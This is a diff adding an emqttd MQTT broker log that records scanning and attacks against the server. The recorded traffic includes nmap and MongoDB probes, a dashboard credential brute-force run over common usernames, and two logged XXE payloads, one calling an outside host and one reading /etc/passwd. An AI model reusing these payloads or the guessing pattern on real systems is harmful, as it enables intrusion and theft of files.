@@ -1,0 +1,946 @@
+
+=====
+===== LOGGING STARTED Fri Feb 15 17:07:27 CST 2019
+=====
+Exec: /root/emqttd/erts-9.0/bin/erlexec -boot /root/emqttd/releases/2.3.11/emqttd -mode embedded -boot_var ERTS_LIB_DIR /root/emqttd/erts-9.0/../lib -mnesia dir "/root/emqttd/data/mnesia/emq@127.0.0.1" -config /root/emqttd/data/configs/app.2019.02.15.17.07.28.config -args_file /root/emqttd/data/configs/vm.2019.02.15.17.07.28.args -vm_args /root/emqttd/data/configs/vm.2019.02.15.17.07.28.args -- console
+Root: /root/emqttd
+/root/emqttd
+Erlang/OTP 20 [erts-9.0] [source] [64-bit] [smp:1:1] [ds:1:1:10] [async-threads:32] [hipe] [kernel-poll:true]
+
+starting emqttd on node 'emq@127.0.0.1'
+emqttd ctl is starting...[ok]
+emqttd hook is starting...[ok]
+emqttd router is starting...[ok]
+emqttd pubsub is starting...[ok]
+emqttd stats is starting...[ok]
+emqttd metrics is starting...[ok]
+emqttd pooler is starting...[ok]
+emqttd trace is starting...[ok]
+emqttd client manager is starting...[ok]
+emqttd session manager is starting...[ok]
+emqttd session supervisor is starting...[ok]
+emqttd wsclient supervisor is starting...[ok]
+emqttd broker is starting...[ok]
+emqttd alarm is starting...[ok]
+emqttd mod supervisor is starting...[ok]
+emqttd bridge supervisor is starting...[ok]
+emqttd access control is starting...[ok]
+emqttd system monitor is starting...[ok]
+emqttd 2.3.11 is running now
+Eshell V9.0  (abort with ^G)
+(emq@127.0.0.1)1> Load emq_mod_presence module successfully.
+dashboard:http listen on 0.0.0.0:18083 with 4 acceptors.
+mqtt:tcp listen on 127.0.0.1:11883 with 4 acceptors.
+mqtt:tcp listen on 0.0.0.0:1883 with 16 acceptors.
+mqtt:ws listen on 0.0.0.0:8083 with 4 acceptors.
+mqtt:ssl listen on 0.0.0.0:8883 with 16 acceptors.
+mqtt:wss listen on 0.0.0.0:8084 with 4 acceptors.
+mqtt:api listen on 0.0.0.0:8080 with 4 acceptors.
+17:07:33.367 [error] gen_server <0.1498.0> terminated with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/EquipmentSituat...">>,...}]},...}, {proto_state,{{117,48,224,90},60260},#Fun<emqttd_client.0.18944683>,true,<<"equipment1">>,<0.1498.0>,...}) line 191
+17:07:33.367 [error] CRASH REPORT Process <0.1498.0> with 0 neighbours exited with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/EquipmentSituat...">>,...}]},...}, {proto_state,{{117,48,224,90},60260},#Fun<emqttd_client.0.18944683>,true,<<"equipment1">>,<0.1498.0>,...}) line 191 in gen_server2:terminate/3 line 1157
+17:07:33.368 [error] Supervisor 'esockd_connection_sup - <0.1431.0>' had child connection started with emqttd_client:start_link([{max_publish_rate,0},{client_idle_timeout,30000},{client_enable_stats,false},{max_clientid_len,...},...]) at <0.1498.0> exit with reason no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/EquipmentSituat...">>,...}]},...}, {proto_state,{{117,48,224,90},60260},#Fun<emqttd_client.0.18944683>,true,<<"equipment1">>,<0.1498.0>,...}) line 191 in context connection_crashed
+17:08:29.520 [error] HTTP Auth failure: username=admin, reason="Password error"
+
+===== Fri Feb 15 17:16:55 CST 2019
+17:16:55.316 [error] Unexpected WS Request: GET /
+17:16:55.405 [error] Unexpected WS Request: GET /nice ports,/Trinity.txt.bak
+17:17:00.546 [error] Unexpected WS Request: OPTIONS /
+17:17:33.423 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.1957.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.2692>,#Fun<esockd_transport.2.122912610>,[]]},'OPTIONS',...]}, 'OPTIONS') line 67 in context connection_crashed
+17:17:33.424 [error] Error in process <0.1957.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.2692>,#Fun<esockd_transport.2.122912610>,[]]},'OPTIONS',"/",{1,0},{0,nil}]},'OPTIONS'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+17:17:57.095 [error] SSL: hello: tls_handshake.erl:191:Fatal error: protocol version
+17:21:20.181 [error] gen_server <0.2222.0> terminated with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},60396},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.2222.0>,true,...}) line 191
+17:21:20.182 [error] CRASH REPORT Process <0.2222.0> with 0 neighbours exited with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},60396},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.2222.0>,true,...}) line 191 in gen_server2:terminate/3 line 1157
+17:21:20.182 [error] Supervisor 'esockd_connection_sup - <0.1431.0>' had child connection started with emqttd_client:start_link([{max_publish_rate,0},{client_idle_timeout,30000},{client_enable_stats,false},{max_clientid_len,...},...]) at <0.2222.0> exit with reason no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},60396},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.2222.0>,true,...}) line 191 in context connection_crashed
+
+===== ALIVE Fri Feb 15 17:36:20 CST 2019
+
+===== Fri Feb 15 17:41:45 CST 2019
+17:41:45.900 [error] gen_server <0.3041.0> terminated with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},60604},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.3041.0>,true,...}) line 191
+17:41:45.900 [error] CRASH REPORT Process <0.3041.0> with 0 neighbours exited with reason: no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},60604},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.3041.0>,true,...}) line 191 in gen_server2:terminate/3 line 1157
+17:41:45.901 [error] Supervisor 'esockd_connection_sup - <0.1431.0>' had child connection started with emqttd_client:start_link([{max_publish_rate,0},{client_idle_timeout,30000},{client_enable_stats,false},{max_clientid_len,...},...]) at <0.3041.0> exit with reason no function clause matching emqttd_protocol:process({mqtt_packet,{mqtt_packet_header,8,false,2,false},{mqtt_packet_subscribe,1,[{<<"/Consumption">>,...}]},...}, {proto_state,{{117,48,224,90},60604},#Fun<emqttd_client.0.18944683>,true,<<"6067">>,<0.3041.0>,true,...}) line 191 in context connection_crashed
+
+===== ALIVE Fri Feb 15 17:56:46 CST 2019
+
+===== ALIVE Fri Feb 15 18:11:46 CST 2019
+18:14:43.862 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.4049.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.3733>,#Fun<esockd_transport.2.122912610>,[]]},'OPTIONS',...]}, 'OPTIONS') line 67 in context connection_crashed
+18:14:43.863 [error] Error in process <0.4049.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.3733>,#Fun<esockd_transport.2.122912610>,[]]},'OPTIONS',"/",{1,0},{0,nil}]},'OPTIONS'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:14:45.620 [error] SSL: hello: tls_handshake.erl:191:Fatal error: protocol version
+18:14:45.704 [error] SSL: hello: tls_handshake.erl:178:Fatal error: insufficient security - no_suitable_ciphers
+18:16:39.320 [error] Client(nmapSZPRHDNUGIQZTZBH@116.196.81.45:39797): Cannot SUBSCRIBE [{<<"$SYS/#">>,[{qos,0}]},{<<"#">>,[{qos,0}]}] for ACL Deny
+18:16:40.485 [error] SSL: hello: tls_handshake.erl:178:Fatal error: insufficient security - no_suitable_ciphers
+18:16:50.572 [error] Client(116.196.81.45:40977): Parser failed for {function_clause,[{emqttd_parser,parse_utf,[<<3,0,255,0,0,0,16,0,0,5,0,0,4,1,0,128,0,0,2,0,0,8>>],[{file,"src/emqttd_parser.erl"},{line,206}]},{emqttd_parser,parse_topics,3,[{file,"src/emqttd_parser.erl"},{line,195}]},{emqttd_parser,parse_frame,3,[{file,"src/emqttd_parser.erl"},{line,147}]},{emqttd_client,received,2,[{file,"src/emqttd_client.erl"},{line,319}]},{gen_server2,handle_msg,2,[{file,"src/gen_server2.erl"},{line,1046}]},{proc_lib,init_p_do_apply,3,[{file,"proc_lib.erl"},{line,247}]}]}
+18:16:50.573 [error] Client(116.196.81.45:40977): Error data: <<129,24,1,3,3,0,255,0,0,0,16,0,0,5,0,0,4,1,0,128,0,0,2,0,0,8,0,0,20,0,0,3,0,0,1,0,0,21,0,0,6,0,0,22,0,0,23,0,0,51,0,0,57,0,0,25,0,0,58,0,0,26,0,0,24,0,0,53,0,0,9,0,0,10,0,0,27,0,0,47,0,0,52,0,0,59,0,0,165,0,0,163,0,0,161,0,0,159,0,0,107,0,0,106,0,0,105,0,0,104,0,0,56,0,0,55,0,0,54,0,0,136,0,0,135,0,0,134,0,0,133,0,0,167,0,0,109,0,0,137,0,0,157,0,0,61,0,0,132,0,0,164,0,0,162,0,0,160,0,0,158,0,0,103,0,0,64,0,0,63,0,0,62,0,0,50,0,0,49,0,0,48,0,0,154,0,0,153,0,0,152,0,0,151,0,0,69,0,0,68,0,0,67,0,0,66,0,0,166,0,0,108,0,0,155,0,0,70,0,0,156,0,0,60,0,0,150,0,0,65,0,0,7,5,0,128,3,0,128,0,0,19,0,0,16,0,0,13,7,0,192,0,0,18,0,0,15,0,0,12,0,0,17,0,0,255,129,144,68,158,119,72,181,211,253,24,136,118,212,223,118,67>>
+18:16:51.207 [error] Client(116.196.81.45:41154): Parser failed for {function_clause,[{emqttd_parser,parse_utf,[<<1,2,0>>],[{file,"src/emqttd_parser.erl"},{line,206}]},{emqttd_parser,parse_frame,3,[{file,"src/emqttd_parser.erl"},{line,80}]},{emqttd_client,received,2,[{file,"src/emqttd_client.erl"},{line,319}]},{gen_server2,handle_msg,2,[{file,"src/gen_server2.erl"},{line,1046}]},{proc_lib,init_p_do_apply,3,[{file,"proc_lib.erl"},{line,247}]}]}
+18:16:51.208 [error] Client(116.196.81.45:41154): Error data: <<22,3,1,2,0,1,0,1,252,3,3,134,38,7,156,73,232,139,217,160,165,255,182,160,249,47,0,177,87,6,167,37,53,102,51,121,117,204,21,4,219,183,152,0,0,244,0,5,0,4,0,2,0,8,0,20,0,3,0,1,0,21,0,6,0,22,0,23,0,51,0,57,0,25,0,58,0,26,0,24,0,53,0,9,0,10,0,27,0,47,0,52,192,16,192,6,192,21,192,11,192,1,0,59,192,48,192,44,192,40,192,36,192,20,192,10,0,165,0,163,0,161,0,159,0,107,0,106,0,105,0,104,0,56,0,55,0,54,0,136,0,135,0,134,0,133,192,25,0,167,0,109,0,137,192,50,192,46,192,42,192,38,192,15,192,5,0,157,0,61,0,132,192,47,192,43,192,39,192,35,192,19,192,9,0,164,0,162,0,160,0,158,0,103,0,64,0,63,0,62,0,50,0,49,0,48,0,154,0,153,0,152,0,151,0,69,0,68,0,67,0,66,192,24,0,166,0,108,0,155,0,70,192,49,192,45,192,41,192,37,192,14,192,4,0,156,0,60,0,150,0,65,0,7,192,17,192,7,192,22,192,12,192,2,192,18,192,8,0,19,0,16,0,13,192,23,192,13,192,3,0,18,0,15,0,12,0,17,0,255,1,0,0,223,0,11,0,4,3,0,1,2,0,10,0,28,0,26,0,23,0,25,0,28,0,27,0,24,0,26,0,22,0,14,0,13,0,11,0,12,0,9,0,10,0,35,0,0,0,13,0,32,0,30,6,1,6,2,6,3,5,1,5,2,5,3,4,1,4,2,4,3,3,1,3,2,3,3,2,1,2,2,2,3,0,15,0,1,1,0,21,0,134,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0>>
+
+===== Fri Feb 15 18:22:56 CST 2019
+18:22:56.366 [error] Client(116.196.94.49:43290): Parser failed for {function_clause,[{emqttd_parser,parse_utf,[<<>>],[{file,"src/emqttd_parser.erl"},{line,206}]},{emqttd_parser,parse_frame,3,[{file,"src/emqttd_parser.erl"},{line,122}]},{emqttd_client,received,2,[{file,"src/emqttd_client.erl"},{line,319}]},{gen_server2,handle_msg,2,[{file,"src/gen_server2.erl"},{line,1046}]},{proc_lib,init_p_do_apply,3,[{file,"proc_lib.erl"},{line,247}]}]}
+18:22:56.366 [error] Client(116.196.94.49:43290): Error data: <<58,0,0,0,2,0,0,0,0,0,0,0,212,7,0,0,0,0,0,0,97,100,109,105,110,46,36,99,109,100,0,0,0,0,0,255,255,255,255,19,0,0,0,16,105,115,109,97,115,116,101,114,0,1,0,0,0,0>>
+18:24:45.536 [error] Client(116.196.94.49:51419): Parser failed for {function_clause,[{emqttd_parser,parse_utf,[<<2,0,220>>],[{file,"src/emqttd_parser.erl"},{line,206}]},{emqttd_parser,parse_frame,3,[{file,"src/emqttd_parser.erl"},{line,80}]},{emqttd_client,received,2,[{file,"src/emqttd_client.erl"},{line,319}]},{gen_server2,handle_msg,2,[{file,"src/gen_server2.erl"},{line,1046}]},{proc_lib,init_p_do_apply,3,[{file,"proc_lib.erl"},{line,247}]}]}
+18:24:45.536 [error] Client(116.196.94.49:51419): Error data: <<22,3,2,0,220,1,0,0,216,3,2,83,67,91,144,157,155,114,11,188,12,188,43,146,168,72,151,207,189,57,4,204,22,10,133,3,144,159,119,4,51,212,222,0,0,102,192,20,192,10,192,34,192,33,0,57,0,56,0,136,0,135,192,15,192,5,0,53,0,132,192,18,192,8,192,28,192,27,0,22,0,19,192,13,192,3,0,10,192,19,192,9,192,31,192,30,0,51,0,50,0,154,0,153,0,69,0,68,192,14,192,4,0,47,0,150,0,65,192,17,192,7,192,12,192,2,0,5,0,4,0,21,0,18,0,9,0,20,0,17,0,8,0,6,0,3,0,255,1,0,0,73,0,11,0,4,3,0,1,2,0,10,0,52,0,50,0,14,0,13,0,25,0,11,0,12,0,24,0,9,0,10,0,22,0,23,0,8,0,6,0,7,0,20,0,21,0,4,0,5,0,18,0,19,0,1,0,2,0,3,0,15,0,16,0,17,0,35,0,0,0,15,0,1,1>>
+
+===== Fri Feb 15 18:29:59 CST 2019
+18:29:59.926 [error] Client(116.196.94.49:52838): Parser failed for {{badmatch,{<<>>,<<>>}},[{emqttd_parser,parse_topics,3,[{file,"src/emqttd_parser.erl"},{line,195}]},{emqttd_parser,parse_frame,3,[{file,"src/emqttd_parser.erl"},{line,147}]},{emqttd_client,received,2,[{file,"src/emqttd_client.erl"},{line,319}]},{gen_server2,handle_msg,2,[{file,"src/gen_server2.erl"},{line,1046}]},{proc_lib,init_p_do_apply,3,[{file,"proc_lib.erl"},{line,247}]}]}
+18:29:59.926 [error] Client(116.196.94.49:52838): Error data: <<128,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0>>
+
+===== Fri Feb 15 18:36:36 CST 2019
+18:36:36.303 [error] HTTP Auth failure: username=123456, reason="User not found" 
+18:36:36.534 [error] HTTP Auth failure: username=123456, reason="User not found" 
+18:36:36.549 [error] HTTP Auth failure: username=123456, reason="User not found" 
+18:36:37.000 [error] HTTP Auth failure: username=access, reason="User not found" 
+18:36:37.283 [error] HTTP Auth failure: username=access, reason="User not found" 
+18:36:37.442 [error] HTTP Auth failure: username=123456, reason="User not found" 
+18:36:37.531 [error] HTTP Auth failure: username=access, reason="User not found" 
+18:36:37.660 [error] HTTP Auth failure: username=access, reason="User not found" 
+18:36:37.774 [error] HTTP Auth failure: username=admin, reason="Password error"
+18:36:37.798 [error] HTTP Auth failure: username=access, reason="User not found" 
+18:36:37.882 [error] HTTP Auth failure: username=admin, reason="Password error"
+18:36:38.245 [error] HTTP Auth failure: username=admin, reason="Password error"
+18:36:38.270 [error] HTTP Auth failure: username=admin, reason="Password error"
+18:36:39.065 [error] HTTP Auth failure: username=administrator, reason="User not found"
+18:36:39.105 [error] HTTP Auth failure: username=administrator, reason="User not found"
+18:36:39.810 [error] HTTP Auth failure: username=administrator, reason="User not found"
+18:36:39.931 [error] HTTP Auth failure: username=admin, reason="Password error"
+18:36:40.399 [error] HTTP Auth failure: username=administrator, reason="User not found"
+18:36:40.997 [error] HTTP Auth failure: username=backup, reason="User not found" 
+18:36:41.385 [error] HTTP Auth failure: username=backup, reason="User not found" 
+18:36:41.594 [error] HTTP Auth failure: username=backup, reason="User not found" 
+18:36:41.698 [error] HTTP Auth failure: username=backup, reason="User not found" 
+18:36:42.037 [error] HTTP Auth failure: username=common, reason="User not found" 
+18:36:42.561 [error] HTTP Auth failure: username=common, reason="User not found" 
+18:36:42.982 [error] HTTP Auth failure: username=backup, reason="User not found" 
+18:36:43.033 [error] HTTP Auth failure: username=administrator, reason="User not found"
+18:36:44.214 [error] HTTP Auth failure: username=common, reason="User not found" 
+18:36:44.814 [error] HTTP Auth failure: username=common, reason="User not found" 
+18:36:45.312 [error] HTTP Auth failure: username=domain, reason="User not found" 
+18:36:45.690 [error] HTTP Auth failure: username=domain, reason="User not found" 
+18:36:45.955 [error] HTTP Auth failure: username=domain, reason="User not found" 
+18:36:46.233 [error] HTTP Auth failure: username=common, reason="User not found" 
+18:36:47.035 [error] HTTP Auth failure: username=domain, reason="User not found" 
+18:36:47.323 [error] HTTP Auth failure: username=ghost, reason="User not found"
+18:36:47.724 [error] HTTP Auth failure: username=ghost, reason="User not found"
+18:36:47.910 [error] HTTP Auth failure: username=ghost, reason="User not found"
+18:36:48.034 [error] HTTP Auth failure: username=123456, reason="User not found" 
+18:36:48.270 [error] HTTP Auth failure: username=ghost, reason="User not found"
+18:36:48.418 [error] HTTP Auth failure: username=ghost, reason="User not found"
+18:36:48.566 [error] HTTP Auth failure: username=guest, reason="User not found"
+18:36:48.688 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7233.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5664>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:36:48.689 [error] Error in process <0.7233.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5664>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/?=%3C%21DOCTYPE+foo+%5B%3C%21ELEMENT+foo+ANY+%3E%3C%21ENTITY+xxe+SYSTEM+%22http%3A%2F%2F116.196.112.30%3A8082%2F--dbd4af1f9ebca18671806cd83f7f7a70--%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",{1,1},{11,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/xml"},{"content-length",{'Content-Length',"138"},nil,nil},nil}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:36:48.960 [error] HTTP Auth failure: username=guest, reason="User not found"
+18:36:49.092 [error] HTTP Auth failure: username=guest, reason="User not found"
+18:36:49.231 [error] HTTP Auth failure: username=domain, reason="User not found" 
+18:36:49.303 [error] HTTP Auth failure: username=guest, reason="User not found"
+18:36:49.368 [error] HTTP Auth failure: username=guest1, reason="User not found" 
+18:36:49.417 [error] HTTP Auth failure: username=guest, reason="User not found"
+18:36:49.710 [error] HTTP Auth failure: username=guest1, reason="User not found" 
+18:36:49.796 [error] HTTP Auth failure: username=guest1, reason="User not found" 
+18:36:49.819 [error] HTTP Auth failure: username=guest1, reason="User not found" 
+18:36:49.839 [error] HTTP Auth failure: username=guest1, reason="User not found" 
+18:36:50.032 [error] HTTP Auth failure: username=guestuser, reason="User not found"
+18:36:50.293 [error] HTTP Auth failure: username=guestuser, reason="User not found"
+18:36:50.384 [error] HTTP Auth failure: username=guestuser, reason="User not found"
+18:36:50.521 [error] HTTP Auth failure: username=guestuser, reason="User not found"
+18:36:50.591 [error] HTTP Auth failure: username=guestuser, reason="User not found"
+18:36:50.818 [error] HTTP Auth failure: username=hello, reason="User not found"
+18:36:50.972 [error] HTTP Auth failure: username=hello, reason="User not found"
+18:36:51.664 [error] HTTP Auth failure: username=hello, reason="User not found"
+18:36:51.738 [error] HTTP Auth failure: username=hello, reason="User not found"
+18:36:52.166 [error] HTTP Auth failure: username=root, reason="User not found"
+18:36:52.205 [error] HTTP Auth failure: username=hello, reason="User not found"
+18:36:52.365 [error] HTTP Auth failure: username=root, reason="User not found"
+18:36:52.642 [error] HTTP Auth failure: username=root, reason="User not found"
+18:36:53.088 [error] HTTP Auth failure: username=root, reason="User not found"
+18:36:53.586 [error] HTTP Auth failure: username=secret, reason="User not found" 
+18:36:54.019 [error] HTTP Auth failure: username=root, reason="User not found"
+18:36:54.471 [error] HTTP Auth failure: username=secret, reason="User not found" 
+18:36:54.985 [error] HTTP Auth failure: username=secret, reason="User not found" 
+18:36:55.745 [error] HTTP Auth failure: username=secret, reason="User not found" 
+18:36:55.882 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.7277.0> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.5706>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:36:55.883 [error] Error in process <0.7277.0> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.5706>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/?=%3C%21DOCTYPE+foo+%5B%3C%21ELEMENT+foo+ANY+%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",{1,1},{11,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/xml"},{"content-length",{'Content-Length',"93"},nil,nil},nil}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:36:56.033 [error] HTTP Auth failure: username=secret, reason="User not found" 
+18:36:56.258 [error] HTTP Auth failure: username=server, reason="User not found" 
+18:36:56.701 [error] HTTP Auth failure: username=server, reason="User not found" 
+18:36:56.911 [error] HTTP Auth failure: username=server, reason="User not found" 
+18:36:57.103 [error] HTTP Auth failure: username=server, reason="User not found" 
+18:36:57.347 [error] HTTP Auth failure: username=service, reason="User not found"
+18:36:57.423 [error] HTTP Auth failure: username=service, reason="User not found"
+18:36:57.654 [error] HTTP Auth failure: username=server, reason="User not found" 
+18:36:57.782 [error] HTTP Auth failure: username=service, reason="User not found"
+18:36:57.897 [error] HTTP Auth failure: username=service, reason="User not found"
+18:36:58.513 [error] HTTP Auth failure: username=sys, reason="User not found"
+18:36:59.202 [error] HTTP Auth failure: username=service, reason="User not found"
+18:36:59.294 [error] HTTP Auth failure: username=sys, reason="User not found"
+18:36:59.901 [error] HTTP Auth failure: username=sys, reason="User not found"
+18:37:00.024 [error] HTTP Auth failure: username=sys, reason="User not found"
+18:37:00.584 [error] HTTP Auth failure: username=system, reason="User not found" 
+18:37:01.723 [error] HTTP Auth failure: username=system, reason="User not found" 
+18:37:02.296 [error] HTTP Auth failure: username=system, reason="User not found" 
+18:37:02.783 [error] HTTP Auth failure: username=system, reason="User not found" 
+18:37:02.873 [error] HTTP Auth failure: username=system, reason="User not found" 
+18:37:02.999 [error] HTTP Auth failure: username=temp, reason="User not found"
+18:37:03.695 [error] HTTP Auth failure: username=sys, reason="User not found"
+18:37:03.886 [error] HTTP Auth failure: username=temp, reason="User not found"
+18:37:04.026 [error] HTTP Auth failure: username=temp, reason="User not found"
+18:37:04.532 [error] HTTP Auth failure: username=temp, reason="User not found"
+18:37:05.055 [error] HTTP Auth failure: username=tempuser, reason="User not found"
+18:37:05.738 [error] HTTP Auth failure: username=tempuser, reason="User not found"
+18:37:06.139 [error] HTTP Auth failure: username=tempuser, reason="User not found"
+18:37:06.186 [error] HTTP Auth failure: username=tempuser, reason="User not found"
+18:37:06.640 [error] HTTP Auth failure: username=tempuser, reason="User not found"
+18:37:06.853 [error] HTTP Auth failure: username=test, reason="User not found"
+18:37:08.774 [error] HTTP Auth failure: username=test, reason="User not found"
+18:37:09.220 [error] HTTP Auth failure: username=test, reason="User not found"
+18:37:09.494 [error] HTTP Auth failure: username=test, reason="User not found"
+18:37:09.642 [error] HTTP Auth failure: username=test123, reason="User not found"
+18:37:09.696 [error] HTTP Auth failure: username=temp, reason="User not found"
+18:37:09.734 [error] HTTP Auth failure: username=test, reason="User not found"
+18:37:09.910 [error] HTTP Auth failure: username=test123, reason="User not found"
+18:37:09.926 [error] HTTP Auth failure: username=test123, reason="User not found"
+18:37:10.308 [error] HTTP Auth failure: username=tester, reason="User not found" 
+18:37:10.355 [error] HTTP Auth failure: username=test123, reason="User not found"
+18:37:10.396 [error] HTTP Auth failure: username=tester, reason="User not found" 
+18:37:10.484 [error] HTTP Auth failure: username=tester, reason="User not found" 
+18:37:10.896 [error] HTTP Auth failure: username=tester, reason="User not found" 
+18:37:11.049 [error] HTTP Auth failure: username=tester, reason="User not found" 
+18:37:11.079 [error] HTTP Auth failure: username=test123, reason="User not found"
+18:37:11.090 [error] HTTP Auth failure: username=user, reason="User not found"
+18:37:11.780 [error] HTTP Auth failure: username=user, reason="User not found"
+18:37:11.932 [error] HTTP Auth failure: username=user, reason="User not found"
+18:37:12.196 [error] HTTP Auth failure: username=user123, reason="User not found"
+18:37:12.365 [error] HTTP Auth failure: username=user, reason="User not found"
+18:37:12.812 [error] HTTP Auth failure: username=user123, reason="User not found"
+18:37:12.951 [error] HTTP Auth failure: username=user123, reason="User not found"
+18:37:13.138 [error] HTTP Auth failure: username=username, reason="User not found"
+18:37:13.289 [error] HTTP Auth failure: username=username, reason="User not found"
+18:37:13.339 [error] HTTP Auth failure: username=user123, reason="User not found"
+18:37:13.407 [error] HTTP Auth failure: username=username, reason="User not found"
+18:37:13.624 [error] HTTP Auth failure: username=user123, reason="User not found"
+18:37:13.692 [error] HTTP Auth failure: username=username, reason="User not found"
+18:37:13.784 [error] HTTP Auth failure: username=username, reason="User not found"
+18:37:14.079 [error] HTTP Auth failure: username=usr123, reason="User not found" 
+18:37:14.205 [error] HTTP Auth failure: username=usr123, reason="User not found" 
+18:37:14.271 [error] HTTP Auth failure: username=usr123, reason="User not found" 
+18:37:14.421 [error] HTTP Auth failure: username=user, reason="User not found"
+18:37:14.847 [error] HTTP Auth failure: username=usr123, reason="User not found" 
+18:37:15.304 [error] HTTP Auth failure: username=webadmin, reason="User not found"
+18:37:15.649 [error] HTTP Auth failure: username=webadmin, reason="User not found"
+18:37:15.665 [error] HTTP Auth failure: username=webadmin, reason="User not found"
+18:37:15.720 [error] HTTP Auth failure: username=webadmin, reason="User not found"
